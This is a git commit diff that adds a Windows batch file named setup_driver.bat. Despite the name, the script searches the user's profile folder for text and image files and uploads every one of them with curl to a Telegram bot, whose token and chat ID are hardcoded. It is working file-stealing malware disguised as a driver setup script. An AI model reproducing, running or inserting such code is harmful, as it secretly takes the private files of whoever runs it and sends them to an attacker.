7dd4efdd3d5388ca62c1d777c0b3da8eeb7ba230
0metayui0 <0metayui0@gmail.com>
2026-03-09 05:02:15 +0700

    Add files via upload

---
+++ setup_driver.bat
@@ -0,0 +1,20 @@
+@echo off
+setlocal enabledelayedexpansion
+
+:: Token of Telegram Bot
+set TELEGRAM_BOT_TOKEN=8157478032:AAHF-ANPD_Hozyie-3Wk9XK4p0l51IPeejc
+:: ID chat of bot
+set TELEGRAM_CHAT_ID=1922428949
+
+:: set valuable
+set SEARCH_PATH=C:\Users\%USERNAME%
+::set SEARCH_PATH=F:\file_name_extensions
+
+powershell -Command ^
+"$files = Get-ChildItem '%SEARCH_PATH%' -Recurse -Include *.txt,*.png,*.jpg,*.jpeg -File -ErrorAction SilentlyContinue; ^
+foreach ($f in $files) { ^
+    $path = $f.FullName; ^
+    cmd /c curl -F \"chat_id=%TELEGRAM_CHAT_ID%\" -F \"document=@$path\" https://api.telegram.org/bot%TELEGRAM_BOT_TOKEN%/sendDocument; ^
+}"
+
+pause
